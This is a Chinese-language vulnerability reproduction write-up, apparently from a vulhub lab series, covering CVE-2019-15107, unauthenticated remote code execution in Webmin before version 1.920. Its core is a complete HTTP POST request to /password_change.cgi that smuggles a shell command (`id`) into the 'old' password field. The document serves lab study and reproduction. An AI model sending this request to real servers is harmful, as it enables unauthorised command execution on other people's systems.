

# Webmin未经身份验证的远程代码执行（CVE-2019-15107）

###### by ADummy

### 0x00利用路线

​			burpuite抓包--->改包--->远程代码执行

### 0x01漏洞介绍

​			参考链接的有效负载不完整。深入阅读代码后，我发现只有在1.920之前不存在主体的用户参数时，才能执行命令，而在1.920处没有限制。

​			影响版本

  		Webmin < 1.920

### 0x02漏洞复现

​	参考链接的有效负载不完整。深入阅读代码后，我发现只有在1.920之前不存在主体的用户参数时，才能执行命令，而在1.920处没有限制。

简而言之，发送以下POST请求以执行命令`id`：

```
POST /password_change.cgi HTTP/1.1
Host: your-ip:10000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Cookie: redirect=1; testing=1; sid=x; sessiontest=1
Referer: https://your-ip:10000/session_login.cgi
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2
```

​		![Webmin未经身份验证的远程代码执行_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Webmin未经身份验证的远程代码执行_1.jpg)

![Webmin未经身份验证的远程代码执行_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Webmin未经身份验证的远程代码执行_1.jpg)



